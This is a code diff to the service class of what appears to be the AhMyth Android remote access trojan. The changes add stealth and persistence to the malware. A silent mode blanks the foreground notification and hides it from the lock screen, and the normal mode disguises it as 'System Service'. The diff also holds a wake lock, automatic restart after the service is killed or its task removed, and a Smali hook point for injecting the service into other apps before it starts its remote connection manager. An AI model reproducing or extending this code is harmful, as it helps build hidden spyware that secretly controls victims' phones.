@@ -8,138 +8,330 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ServiceInfo;
 import android.graphics.Color;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
-import android.support.annotation.RequiresApi;
+import android.os.PowerManager;
 import android.support.v4.app.NotificationCompat;
+import android.util.Log;
 
 import java.lang.reflect.Method;
 
 public class MainService extends Service {
+    
+    private static final String TAG = "AhMythService";
+    private static final int NOTIFICATION_ID = 1;
+    private static final String CHANNEL_ID = "ahmyth_service_channel";
+    
     private static Context contextOfApplication;
+    private PowerManager.WakeLock wakeLock;
+    private boolean isRunning = false;
 
-        private static void findContext() throws Exception {
-            Class<?> activityThreadClass;
-            try {
-                activityThreadClass = Class.forName("android.app.ActivityThread");
-            } catch (ClassNotFoundException e) {
-                // No context
-                return;
-            }
+    private static void findContext() throws Exception {
+        Class<?> activityThreadClass;
+        try {
+            activityThreadClass = Class.forName("android.app.ActivityThread");
+        } catch (ClassNotFoundException e) {
+            return;
+        }
 
-            final Method currentApplication = activityThreadClass.getMethod("currentApplication");
-            final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-            if (context == null) {
-                // Post to the UI/Main thread and try and retrieve the Context
-                final Handler handler = new Handler(Looper.getMainLooper());
-                handler.post(new Runnable() {
-                    public void run() {
-                        try {
-                            Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-                            if (context != null) {
-                                startService(context);
-                            }
-                        } catch (Exception ignored) {
+        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+        if (context == null) {
+            final Handler handler = new Handler(Looper.getMainLooper());
+            handler.post(new Runnable() {
+                public void run() {
+                    try {
+                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+                        if (context != null) {
+                            startService(context);
                         }
+                    } catch (Exception ignored) {
                     }
-                });
+                }
+            });
+        } else {
+            startService(context);
+        }
+    }
+
+    // Smali hook point
+    public static void start() {
+        try {
+            Log.d(TAG, "Static start() called");
+            findContext();
+        } catch (Exception e) {
+            Log.e(TAG, "Error in start()", e);
+        }
+    }
+
+    public static void startService(Context context) {
+        try {
+            Log.d(TAG, "startService called");
+            Intent intent = new Intent(context, MainService.class);
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(intent);
             } else {
-                startService(context);
+                context.startService(intent);
             }
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting service", e);
         }
+    }
 
-        // Smali hook point
-        public static void start() {
-            try {
-                findContext();
-            } catch (Exception ignored) {
-            }
-        }
-
-        public static void startService(Context context) {
-            context.startService(new Intent(context, MainService.class));
-        }
-
-
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d(TAG, "Service onCreate");
+        contextOfApplication = this;
+        
+        // Acquire wake lock to keep service running
+        acquireWakeLock();
+    }
 
     @Override
     public IBinder onBind(Intent intent) {
-        // TODO: Return the communication channel to the service.
-        //throw new UnsupportedOperationException("Not yet implemented");
         return null;
     }
 
-
     @Override
-    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
-    {
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
-            startMyOwnForeground();
+    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
+        Log.d(TAG, "Service onStartCommand - SDK: " + Build.VERSION.SDK_INT);
+        
+        if (isRunning) {
+            Log.d(TAG, "Service already running");
+            return Service.START_STICKY;
         }
-        else {
-            startForeground(1, new Notification());
-        }
-
+        
+        isRunning = true;
         contextOfApplication = this;
-        ConnectionManager.startAsync(this);
+        
+        // Start foreground immediately to prevent ANR
+        startForegroundWithNotification();
+        
+        // Start the connection manager
+        try {
+            Log.d(TAG, "Starting ConnectionManager");
+            ConnectionManager.startAsync(this);
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting ConnectionManager", e);
+        }
+        
         return Service.START_STICKY;
+    }
+
+    private void startForegroundWithNotification() {
+        Log.d(TAG, "Starting foreground notification");
+        
+        try {
+            // Create notification channel for Android 8+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                createNotificationChannel();
+            }
+            
+            // Build notification - use minimal/silent notification if in stealth mode
+            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID);
+            
+            if (StealthConfig.SILENT_NOTIFICATION) {
+                // Ultra-minimal notification for stealth
+                builder.setContentTitle("")
+                    .setContentText("")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+                    .setPriority(NotificationCompat.PRIORITY_MIN)
+                    .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                    .setOngoing(true)
+                    .setShowWhen(false)
+                    .setAutoCancel(false)
+                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                    .setSound(null)
+                    .setVibrate(null);
+            } else {
+                // Normal notification
+                builder.setContentTitle("System Service")
+                    .setContentText("Running in background")
+                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
+                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                    .setOngoing(true)
+                    .setShowWhen(false)
+                    .setAutoCancel(false);
+            }
+            
+            // Add pending intent to open app
+            Intent notificationIntent = new Intent(this, MainActivity.class);
+            PendingIntent pendingIntent;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            } else {
+                pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 
+                    PendingIntent.FLAG_UPDATE_CURRENT);
+            }
+            builder.setContentIntent(pendingIntent);
+            
+            Notification notification = builder.build();
+            
+            // Start foreground with appropriate service type for Android 10+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                // Android 14+ requires specific foreground service types
+                startForeground(NOTIFICATION_ID, notification, 
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                // Android 10-13
+                startForeground(NOTIFICATION_ID, notification, 
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+            } else {
+                // Android 9 and below
+                startForeground(NOTIFICATION_ID, notification);
+            }
+            
+            Log.d(TAG, "Foreground notification started successfully");
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting foreground", e);
+            // Fallback for older devices
+            try {
+                startForeground(NOTIFICATION_ID, new Notification());
+            } catch (Exception e2) {
+                Log.e(TAG, "Fallback foreground failed", e2);
+            }
+        }
+    }
+    
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            // Use minimal importance in stealth mode
+            int importance = StealthConfig.SILENT_NOTIFICATION ? 
+                NotificationManager.IMPORTANCE_MIN : 
+                NotificationManager.IMPORTANCE_LOW;
+            
+            NotificationChannel channel = new NotificationChannel(
+                CHANNEL_ID,
+                StealthConfig.SILENT_NOTIFICATION ? " " : "Background Service",
+                importance
+            );
+            
+            channel.setDescription("");
+            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+            channel.setShowBadge(false);
+            channel.enableLights(false);
+            channel.enableVibration(false);
+            channel.setSound(null, null);
+            channel.setBypassDnd(false);
+            
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+                Log.d(TAG, "Notification channel created (stealth: " + StealthConfig.SILENT_NOTIFICATION + ")");
+            }
+        }
+    }
+    
+    private void acquireWakeLock() {
+        try {
+            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (powerManager != null) {
+                wakeLock = powerManager.newWakeLock(
+                    PowerManager.PARTIAL_WAKE_LOCK,
+                    "AhMyth::ServiceWakeLock"
+                );
+                wakeLock.acquire(10*60*1000L); // 10 minutes timeout
+                Log.d(TAG, "Wake lock acquired");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error acquiring wake lock", e);
+        }
+    }
+    
+    private void releaseWakeLock() {
+        try {
+            if (wakeLock != null && wakeLock.isHeld()) {
+                wakeLock.release();
+                Log.d(TAG, "Wake lock released");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error releasing wake lock", e);
+        }
     }
 
     @Override
     public void onDestroy() {
+        Log.d(TAG, "Service onDestroy");
+        isRunning = false;
+        releaseWakeLock();
+        
+        // Schedule restart
+        scheduleRestart();
+        
         super.onDestroy();
     }
 
-
-    public static Context getContextOfApplication()
-    {
+    public static Context getContextOfApplication() {
         return contextOfApplication;
     }
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         super.onTaskRemoved(rootIntent);
-
-//        Log.d(TAG, "TASK REMOVED");
-
-        PendingIntent service = PendingIntent.getService(
-                getApplicationContext(),
-                1001,
-                new Intent(getApplicationContext(), MainService.class),
-                PendingIntent.FLAG_ONE_SHOT);
-
-        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-        alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, 1000, service);
-
+        Log.d(TAG, "Task removed - scheduling restart");
+        scheduleRestart();
     }
-
-
-    //    --------------------------------------My Own Foreground----------------------------------------------- //
-
-    @RequiresApi(api = Build.VERSION_CODES.O)
-    private void startMyOwnForeground(){
-        String NOTIFICATION_CHANNEL_ID = "com.play.service.techno";
-        String channelName = "My Background Service";
-        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
-        chan.setLightColor(Color.BLUE);
-        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
-        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-        assert manager != null;
-        manager.createNotificationChannel(chan);
-
-        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
-        Notification notification = notificationBuilder.setOngoing(true)
-                .setContentTitle("App is running in background")
-                .setPriority(NotificationManager.IMPORTANCE_MIN)
-                .setCategory(Notification.CATEGORY_SERVICE)
-                .build();
-        startForeground(1, notification);
+    
+    private void scheduleRestart() {
+        try {
+            Intent restartServiceIntent = new Intent(getApplicationContext(), MainService.class);
+            restartServiceIntent.setPackage(getPackageName());
+            
+            PendingIntent restartServicePendingIntent;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                restartServicePendingIntent = PendingIntent.getService(
+                    getApplicationContext(), 1001, restartServiceIntent,
+                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
+                );
+            } else {
+                restartServicePendingIntent = PendingIntent.getService(
+                    getApplicationContext(), 1001, restartServiceIntent,
+                    PendingIntent.FLAG_ONE_SHOT
+                );
+            }
+            
+            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+            if (alarmManager != null) {
+                long triggerTime = System.currentTimeMillis() + 1000;
+                
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                    // Android 12+ requires permission for exact alarms
+                    if (alarmManager.canScheduleExactAlarms()) {
+                        alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
+                    } else {
+                        alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
+                    }
+                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
+                } else {
+                    alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, restartServicePendingIntent);
+                }
+                
+                Log.d(TAG, "Restart scheduled");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error scheduling restart", e);
+        }
     }
-
-//    --------------------------------------My Own Foreground----------------------------------------------- //
-
+    
+    @Override
+    public void onLowMemory() {
+        super.onLowMemory();
+        Log.w(TAG, "Low memory warning");
+    }
+    
+    @Override
+    public void onTrimMemory(int level) {
+        super.onTrimMemory(level);
+        Log.d(TAG, "Trim memory level: " + level);
+    }
 }
